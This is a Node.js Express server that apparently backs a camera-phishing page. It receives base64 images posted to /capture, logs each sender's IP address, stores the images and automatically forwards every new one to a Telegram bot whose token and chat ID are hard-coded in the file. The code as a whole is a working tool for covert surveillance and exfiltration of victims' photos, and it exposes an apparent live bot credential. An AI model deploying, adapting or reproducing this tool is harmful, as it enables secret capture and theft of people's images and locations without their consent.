const express = require("express");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const FormData = require("form-data");
const chokidar = require("chokidar");

const app = express();
const PORT = 3000;

const templatesDir = path.join(__dirname, "templates");
const indexPath = path.join(templatesDir, "index.html");

// === Telegram Bot Config ===
const telegramToken = '7970078573:AAEzOuBKiLnA8jDnKNzwKFZdRbSZzPNo2KA';
const chatId = '7041065272';

// Ensure the 'capture' directory exists
const captureDir = path.join(__dirname, "capture");
if (!fs.existsSync(captureDir)) {
    fs.mkdirSync(captureDir);
}

app.use(express.static("public"));
app.use(express.json({ limit: "5mb" }));

// Function to send image to Telegram
function sendPhotoToTelegram(photoPath) {
    const url = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", fs.createReadStream(photoPath));

    axios.post(url, formData, { headers: formData.getHeaders() })
        .then(res => {
            console.log(`Telegram: Sent ${path.basename(photoPath)}`);
        })
        .catch(err => {
            console.error("Telegram error:", err.message);
        });
}

// Watch capture folder for new images
chokidar.watch(captureDir).on("add", (filePath) => {
    if (/\.(jpg|jpeg|png|gif|png)$/i.test(filePath)) {
        console.log(`[+] New file detected: ${filePath}`);
        sendPhotoToTelegram(filePath);
    }
});

app.get("/", (req, res) => {
    fs.readFile(indexPath, 'utf8', (err, html) => {
        if (err) {
            console.error("Error reading HTML file:", err);
            return res.sendStatus(500);
        }
        res.send(html);
    });
});

// Handle image capture
app.post("/capture", (req, res) => {
    if (!req.body.image) {
        return res.sendStatus(400);
    }

    const userIP = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const imageData = req.body.image.replace(/^data:image\/png;base64,/, "");
    const imagePath = path.join(captureDir, `capture_${Date.now()}.png`);

    fs.writeFile(imagePath, imageData, "base64", (err) => {
        if (err) {
            console.error("Error saving image:", err);
            return res.sendStatus(500);
        }

        console.log(`[+] Photo received! IP: ${userIP}`);
        fs.appendFileSync("server.log", `Photo received! IP: ${userIP}\n`);
        res.sendStatus(200);
    });
});

app.listen(PORT, () => {
    console.log(`[+] Server running at http://localhost:${PORT}`);
});
